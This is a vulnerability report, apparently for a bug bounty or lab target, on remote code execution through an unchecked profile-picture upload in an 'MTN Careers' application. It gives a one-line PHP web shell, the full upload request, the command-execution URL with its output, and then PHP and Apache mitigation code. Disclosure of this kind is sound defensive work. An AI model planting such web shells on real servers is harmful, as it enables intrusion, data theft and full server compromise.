# Remote Code Execution (RCE) via Unrestricted File Upload - MTN Careers

## Summary

I identified a Remote Code Execution (RCE) vulnerability in the profile picture upload functionality of the MTN Careers application.

The application accepts file uploads through the "Upload Profile Picture" feature without proper validation of the file type or content. By uploading a PHP file containing malicious code, an attacker can execute arbitrary commands on the server. The uploaded file is stored in a publicly accessible directory (`/subdomains/avatar/uploads/1623/`), allowing direct access and execution.

An attacker can upload a web shell disguised as an image file, then access it through the browser to execute system commands, read sensitive files, or fully compromise the server.

## Vulnerability Type

**Remote Code Execution (RCE) / Unrestricted File Upload**

## Vulnerable Parameter

```text
avatar (file upload field)
```

## Vulnerable URL

```text
https://kzlabs.in/subdomains/avatar/index.php?action=upload
```

## Steps to Reproduce

1. Navigate to the MTN Careers profile page at `https://kzlabs.in/subdomains/avatar/index.php?action=profile`.

2. Click the **Choose File** button under "Upload Profile Picture".

3. Select a PHP file (e.g., `rce.php`) containing the following payload:

   ```php
   <?php system($_GET['cmd']); ?>
   ```

4. Click the **Upload** button.

5. Observe that the application accepts the PHP file despite claiming to only accept JPG, PNG, and GIF formats.

6. The file is uploaded to the server and the application displays "Profile picture updated successfully."

7. The uploaded file is accessible at a URL similar to:

   ```text
   https://kzlabs.in/subdomains/avatar/uploads/1623/avatar-5-10-09-2026-15-35-24.php
   ```

8. Access the uploaded file with a command parameter:

   ```text
   https://kzlabs.in/subdomains/avatar/uploads/1623/avatar-5-10-09-2026-15-35-24.php?cmd=ls
   ```

9. Observe that the server executes the command and lists directory contents, including other uploaded PHP files.

## Proof of Concept

The vulnerability exists because the application only checks the file extension visually but does not validate the actual file content or MIME type. The application also allows `.php` files to be uploaded despite the stated restriction.

The uploaded PHP file is stored in a publicly accessible directory, allowing direct execution:

```http
POST /subdomains/avatar/index.php?action=upload HTTP/2
Host: kzlabs.in
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXX

------WebKitFormBoundaryXXX
Content-Disposition: form-data; name="avatar"; filename="rce.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryXXX--
```

After uploading, accessing the file executes the command:

```http
GET /subdomains/avatar/uploads/1623/avatar-5-10-09-2026-15-35-24.php?cmd=ls HTTP/2
Host: kzlabs.in
```

Response:
```
avatar-1-09-09-2026-03-35-10.php avatar-1-09-09-2026-03-35-13.php avatar-3-09-09-2026-17-17-20.php avatar-5-10-09-2026-15-33-27.php avatar-5-10-09-2026-15-34-18.php avatar-5-10-09-2026-15-35-24.php payload.php
```

The directory listing reveals other uploaded PHP files, confirming that multiple users (or the same user) have successfully uploaded malicious files.

## Impact

An attacker can:

- Execute arbitrary system commands on the server
- Read, write, and delete sensitive files
- Compromise the entire web server
- Pivot to internal networks
- Install backdoors and malware
- Steal sensitive data (database credentials, user data)
- Deface the website
- Use the server for further attacks (DDoS, spam, cryptomining)
- Upload persistent web shells for long-term access

## Recommendation

To mitigate this vulnerability:

- **File Type Validation**: Validate file types using content inspection, not just extensions.
  ```php
  $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
  $finfo = finfo_open(FILEINFO_MIME_TYPE);
  $mime = finfo_file($finfo, $_FILES['avatar']['tmp_name']);
  if (!in_array($mime, $allowed_types)) {
      die("Invalid file type.");
  }
  ```

- **File Extension Validation**: Use a whitelist of allowed extensions.
  ```php
  $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
  $ext = strtolower(pathinfo($_FILES['avatar']['name'], PATHINFO_EXTENSION));
  if (!in_array($ext, $allowed_ext)) {
      die("Invalid file extension.");
  }
  ```

- **Rename Uploaded Files**: Generate random filenames to prevent direct access and execution.
  ```php
  $new_filename = bin2hex(random_bytes(16)) . '.' . $ext;
  move_uploaded_file($_FILES['avatar']['tmp_name'], $upload_dir . $new_filename);
  ```

- **Disable PHP Execution**: Configure the upload directory to not execute PHP files.
  ```apache
  <Directory "/uploads">
      php_flag engine off
  </Directory>
  ```

- **Store Files Outside Webroot**: Store uploaded files outside the web-accessible directory.

- **Use a CDN**: Serve uploaded files from a CDN or separate domain.

- **Content Security Policy (CSP)**: Implement a strict CSP to restrict file execution.

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block malicious uploads.

- **Regular Security Audits**: Conduct regular assessments to identify vulnerabilities.
